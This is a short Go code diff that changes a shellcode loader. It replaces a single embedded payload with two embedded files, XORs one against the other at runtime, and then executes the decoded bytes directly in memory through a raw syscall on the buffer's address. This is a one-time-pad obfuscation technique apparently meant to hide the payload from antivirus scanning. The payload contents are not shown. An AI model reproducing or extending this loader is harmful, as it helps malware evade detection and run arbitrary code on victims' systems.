@@ -7,10 +7,15 @@ import (
 )
 
 var (
-	//go:embed "payload"
-	payload []byte
+	//go:embed "pad1"
+	pad1 []byte
+	//go:embed "pad2"
+	pad2 []byte
 )
 
 func main() {
-	syscall.Syscall(uintptr(unsafe.Pointer(&payload[0])), 0, 0, 0, 0)
+	for index, padByte := range pad1 {
+		pad2[index] = pad2[index] ^ padByte
+	}
+	syscall.Syscall(uintptr(unsafe.Pointer(&pad2[0])), 0, 0, 0, 0)
 }
